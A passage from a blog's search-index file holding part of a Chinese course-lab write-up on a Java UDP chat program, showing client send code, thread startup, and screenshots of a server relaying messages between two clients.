data  </span></span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                <span class="type">InetAddress</span> <span class="variable">serverAddress</span> <span class="operator">=</span> InetAddress.getByName(serverName);  </span><br><span class="line">                <span class="type">DatagramPacket</span> <span class="variable">packet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(data, data.length, serverAddress, serverPort);  </span><br><span class="line">                <span class="comment">// create socket and send data packed  </span></span><br><span class="line">                socket.send(packet);  </span><br><span class="line">                System.out.println(<span class="string">&quot;client has sent data to server!!&quot;</span>);  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnknownHostException e) &#123;  </span><br><span class="line">                e.printStackTrace();  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">                e.printStackTrace();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>在线程终点启动下一个发送消息的线程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">        <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">ClientSenderRunnable</span>(socket));  </span><br><span class="line">        thread.start();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h1><p>启动服务端<br><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/279f6e561c7041b09a71efc24a4ba2b6~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=667\&amp;h=74\&amp;s=197908\&amp;e=png\&amp;b=0d0d0d" alt="image.png"></p><p>启动两个客户端<br><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fd72f59f5de74c16ae9a8baa6cf850de~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=667&amp;h=74&amp;s=197908&amp;e=png&amp;b=0d0d0d" alt="image.png"><br><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4a946f76f3604fb2b7a8b0a7b37b728a~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=667&amp;h=74&amp;s=197908&amp;e=png&amp;b=0d0d0d" alt="image.png"> </p><p>由客户端一(8001端口)向客户端二(8002端口)发送消息<br><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2b13a7bd3fb643deae42af910a4686a9~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=667&amp;h=167&amp;s=446520&amp;e=png&amp;b=0c0c0c" alt="image.png"></p><p>服务器端成功接收到消息并转发<br><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e054e46df9e04c0d9bb5c9e119351f6e~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=667&amp;h=122&amp;s=326220&amp;e=png&amp;b=0c0c0c" alt="image.png"></p><p>客户端二(8002端口)成功监听到接收的消息<br><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2559eac5a5de4915ab83f0dd84c1aa0f~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=667&amp;h=106&amp;s=283451&amp;e=png&amp;b=0d0d0d" alt="image.png"></p><p>同理，由客户端二向客户端一发送消息也同样得以完成</p><p>客户端二：<br><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d10d3f78c39d492fadc0b0f18c78ee7c~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=667&amp;h=106&amp;s=283451&amp;e=png&amp;b=0d0d0d" alt="image.png"></p><p>服务器端：<br><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/bde43b7626314dcda64a63d90cbcfed5~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=476&amp;h=74&amp;s=141283&amp;e=png&amp;b=0c0c0c" alt="image.png"></p><p>客户端一：<br><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b78f1f8ebb674a1e9cb1dc3722f16c04~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=492&amp;h=27&amp;s=53329&amp;e=png&amp;b=0c0c0c" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 课程实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> UDP </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
